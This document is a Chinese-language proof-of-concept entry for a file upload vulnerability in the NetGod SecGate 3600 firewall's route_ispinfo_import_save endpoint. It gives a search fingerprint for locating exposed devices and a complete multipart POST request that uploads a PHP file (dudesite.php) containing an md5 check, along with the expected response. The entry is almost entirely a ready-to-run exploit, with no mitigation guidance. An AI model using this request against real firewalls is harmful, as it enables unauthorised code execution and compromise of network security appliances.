# 网神SecGate3600防火墙route_ispinfo_import_save文件上传漏洞

- **系统**：网神SecGate3600防火墙route_ispinfo_import_save　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`title="网神SecGate 3600防火墙"`
- **请求**：`POST /?g=route_ispinfo_import_save HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWn…`

**请求体 / payload**
```
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="MAX_FILE_SIZE"
10000000
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="reqfile"; filename="dudesite.php"
Content-Type: text/plain
<?php echo md5('666');?>
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="submit_post"
route_ispinfo_import_save
------WebKitFormBoundaryJpMyThWnAxbcBBQc--
```
- **预期**：302　|　—